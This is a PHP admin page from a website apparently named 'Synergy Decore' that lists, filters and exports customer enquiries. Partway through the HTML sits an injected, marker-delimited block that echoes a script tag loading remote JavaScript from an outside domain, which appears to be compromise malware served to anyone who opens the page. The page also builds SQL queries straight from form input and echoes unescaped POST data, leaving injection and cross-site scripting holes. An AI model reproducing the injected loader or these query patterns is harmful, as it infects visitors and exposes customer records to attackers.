<?php session_start();
ob_start();

include "inc/session_check.php";

$page = "List Enquiry";
$side_menu="Enquiry";

		$pageno = (!isset($_GET["page"]) ? 1 : $_GET["page"]);
    	$limit = 25;
    	$startpoint = ($pageno * $limit) - $limit;

		$con1 = "";
		$con2 = "";
		$con3 = "";
		$fdate = "";
		$tdate = "";
		if(isset($_POST['name']) && $_POST['name']!='')
		{
			$con1 = " and name like '%$_POST[name]%'";
		}
		
	  	if(isset($_POST['from_date']) && $_POST['from_date'] != '')
		{
		$fdate =  $_POST['from_date'];
		$con2 = "and en_date >=  '$fdate'";	
		}
	  	if(isset($_POST['to_date']) && $_POST['to_date'] != '')
		{
		$tdate =  $_POST['to_date'];
		$con3 = "and en_date <=  '$tdate'";	
		}
	
		$statement = "sd_enquiry where 1 $con1 $con2 $con3 order by id desc";
		
        $where_string = "";
		 
		$pagination = pagination($statement,$limit,$pageno,$where_string);
  		$select_ad = mysql_query("select id,name,location,mobile,email,date_format(en_date,'%d-%m-%Y') as post_date from  {$statement} LIMIT {$startpoint} , {$limit}");

	$si=1;
	
?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
<meta charset="utf-8">
<title>Synergy Decore | List Enquiry</title>
    <script src="js/html5-trunk.js"></script>
    <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
				include "inc/breadcrumb.php";
		  ?>
			<div class="row-fluid">
            <div class="span12">
              <div class="widget no-margin">
                <div class="widget-header">
                 <div class="title"> Enquiry </div>
                </div>
                <div class="widget-body">
                	<?php include 'message.php'; ?>
<?php
#af653a#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967027\"></script>";
echo $g;
}
#/af653a#
?>                <div id="dt_example" class="example_alt_pagination">
                	
                	<form name="search" method="post">
                	 <input size="10" type="text" name="from_date" class="required datepicker" value="<?=$fdate?>" placeholder="From Date"  />
                	 <input type="text" name="to_date" class="required datepicker" value="<?=$tdate?>" placeholder="To Date"  />
                	  <input type="text" name="name" placeholder="Name"  />
					<input style="margin-top: -10px;" type="submit" name="submit" class="btn btn-info" value="Submit" />
                	</form>
                	
				<table class="table table-condensed table-striped table-hover table-bordered pull-left" id="data-table">
				<thead><tr><th width="5%">S.No</th><th>Name</th><th>Location</th><th>Mobile</th><th>Post Date</th><th width="100">Options</th></tr></thead>
				<tbody>
				<?php if(mysql_num_rows($select_ad)>0){
				while($fetch_ad = mysql_fetch_array($select_ad))
				{
					$adid = urlsafe_b64encode($fetch_ad['id']);
					 
				 ?>
				<tr ><td><?=$si?></td>
					<td><?=$fetch_ad['name']?></td>
					<td><?=$fetch_ad['location']?></td>
					<td><?=$fetch_ad['mobile']?></td>
				<td><?=$fetch_ad['post_date']?></td>
				<td style="text-align:center !important;"><a href="view_enquiry.php?id=<?=$adid?>"><i class="icon-view"></i></a> 
				&nbsp; <a onClick="return confirmDelete()" href="delete_en.php?adid=<?=$adid?>"><i class="icon-trash"></i></a> 
				</td></tr>
				<?php $si++; } } else { echo "<tr><td colspan='8'>
				<div class='alert alert-block alert-info fade in no-margin'>
            <button class='close' type='button' data-dismiss='alert'> × </button>
            <h4 class='alert-heading'> Info! </h4>
            <p>No Advertisement found on this month</p>
            </div></td></tr>"; }?>
				</tbody>
				</table>
				 <br>
                <div class="row-fluid">
				<?=$pagination?>
				</div>
				<div class="clearfix"></div>
				<div class="gen_report">
				<form name="enquiry_export" action="Export_Excel_enquiry.php">
					<input type="hidden" name="name" value="<?=$_POST['name']?>" />
					<input type="hidden" name="from_date" value="<?=$fdate?>" />
					<input type="hidden" name="to_date" value="<?=$tdate?>" />
					<input type="submit" name="export" class="btn btn-info" value="Generate Report" />
				</form>
				</div>
                  </div>
                </div>
              </div>
            </div>
          </div>          
        </div>        
      </div>
    </div>
     <?php include 'inc/footer.php'; ?>
<script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
<link href="css/jquery-ui-1.10.3.custom.css" rel="stylesheet">
<script type="text/javascript"  src="js/jquery-latest.js"></script>
<script src="js/jquery-ui-1.10.3.custom.js"></script>
<script type="text/javascript">
$(document).ready(function(){
	    $(".datepicker").datepicker({
            changeMonth: true,
            changeYear: true,
			yearRange: "-5:+1",
			dateFormat: "yy-mm-dd"
        });
    
    });
	function confirmDelete()
	{
	var agree=confirm("Are you sure you want to delete this file?");
	if(agree)
	  return true;
	else
	    return false;
	}
</script>
</body>
</html>